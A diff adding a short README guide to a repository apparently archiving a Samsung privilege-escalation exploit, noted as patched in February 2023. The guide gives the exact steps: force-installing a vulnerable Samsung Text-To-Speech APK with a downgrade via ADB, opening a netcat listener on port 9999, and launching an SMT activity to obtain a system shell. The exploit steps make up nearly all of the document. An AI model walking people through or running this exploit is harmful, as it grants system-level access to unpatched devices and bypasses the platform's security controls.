@@ -1,4 +1,20 @@
 # K0mraid3s-System-Shell
+Simple guide -- 
+
+1 Install all the apks, open atleast once.
+2 Reboot, when device reboots, run the following command from ADB.
+```adb shell pm install -r -d -f -g --full --install-reason 3 --enable-rollback /data/local/tmp/samsungTTSVULN2.apk 
+```
+3 in one console, type ```nc -lp 9999```
+4 Run the following command in a second console: ```adb shell am start -n com.samsung.SMT/.gui.DownloadList```
+
+DONE. 
+
+if you have issues with it not starting, uninstall SMT (Samsung Text-To-Speech) completely, then reinstall the vuln version and try again from step 3 onward. 
+
+
+
+
 PATCHED AS OF 02/2023
 As seen on XDA before the public disclousure was removed by XDA Moderators.
 It will otherwise remain unchanged here as an archive.
